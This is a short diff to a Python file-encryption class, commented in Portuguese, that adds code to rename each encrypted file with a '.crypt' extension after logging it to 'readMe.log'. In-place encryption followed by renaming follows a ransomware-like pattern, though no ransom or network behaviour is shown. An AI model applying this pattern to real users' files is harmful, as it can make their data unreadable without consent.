@@ -29,6 +29,18 @@ class Cryptografy:
                     file = f.write(encript)
                 with open('readMe.log', 'a') as f:
                     arquivoLog = f.writelines(f'\nO arquivo {itens} foi criptografado em {datetime.now()}\n')
+                    
+                # renomear os arquivos
+                arqui = itens.split('/')
+                tamanho = len(arqui) - 1
+                nomeDosArquivos = arqui[tamanho]
+
+                # pegando so o caminho para ir ao diretório e renomear os arquivos
+                caminhos = itens.split('/')
+                tamanho2 = len(caminhos) - 1
+                novoCaminho = '/'.join(caminhos[:tamanho2]) + '/'
+                os.chdir(novoCaminho)
+                os.rename(f'./{nomeDosArquivos}', f'./{nomeDosArquivos}.crypt')
             
 
 if __name__ == '__main__':
